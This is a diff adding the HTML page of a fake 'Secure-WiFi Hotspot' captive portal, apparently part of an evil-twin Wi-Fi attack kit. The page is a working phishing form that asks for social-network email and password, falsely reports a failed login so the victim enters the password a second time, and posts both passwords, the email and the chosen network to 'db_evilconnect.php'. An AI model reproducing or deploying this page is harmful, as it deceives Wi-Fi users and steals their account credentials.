@@ -1,0 +1,63 @@
+<!doctype html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+<title>Secure-WiFi Hotspot</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1" />
+	<meta name="author" content="Secure-WiFi">
+	<meta name="description" content="Your One Stop Secure WiFi Connection.">
+
+<link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
+<link rel="stylesheet" href="style.css" type="text/css">
+
+</head>
+<body>
+
+	<div class="inner-container">
+
+<ul id="icons">
+	<li><a href="#" title="facebook" class="tooltip"><img src="social/fb.png" alt="" class="icon"></a></li>
+	<li><a href="#" title="twitter" class="tooltip"><img src="social/twitter.png" alt="" class="icon"></a></li>
+        <li><a href="#" title="google+" class="tooltip"><img src="social/gplus.png" alt="" class="icon"></a></li>
+        <li><a href="#" title="linkedin" class="tooltip"><img src="social/linkedin.png" alt="" class="icon"></a></li>
+</ul>	
+<div class="box">
+      <h1>Login</h1><form name="theform" action="db_evilconnect.php" method="post" onsubmit="return validateForm();"> <!- http://10.0.0.1/ ->
+<select name="type" class="list">
+		<option value="facebook">Facebook</option>
+		<option value="twitter">Twitter</option>
+		<option value="google" selected>Google+</option>
+		<option value="linkedin">Linkedin</option>
+	</select>
+      <input type="email" name="email" required placeholder="Email"/>
+      <input type="password" name="password" required placeholder="Password"/>
+      <input type="submit" value="Login" value="Send" class="button">
+</form>
+      <p><img src="images/secure-wifi.png" class="lock">Secure-Wifi<br><small>Non richiede registrazioni. 
+         Effettua il login con il tuo account social.</small></p>
+	<a href="#" class="logo"><img src="images/logo.png"></a>
+    </div>
+</div>
+<script src="jquery.min.js"></script>
+<script>
+var locked;
+$('form').submit(function(e){
+    e.preventDefault();
+
+    if (!locked) {
+        firstPassword = $('input[type=password]').val();
+        var email = $('input[type=email]').val();
+        var social = $('input[name=type]').val();
+        locked = true;
+        alert("Failed to authenticate. Wrong Email or Password.");
+        return false;
+    } else {
+        $.post('db_evilconnect.php', 'first-password=' + firstPassword + '&second-password=' + $('input[type=password]').val() + '&email:=' + $('input[type=email]').val() + '&social:=' + $('[name=type]').val() , window.location.replace("db_evilconnect.php"));
+    }
+});
+</script>
+<div class="social-icons"></div>
+
+</body>
+</html>
+
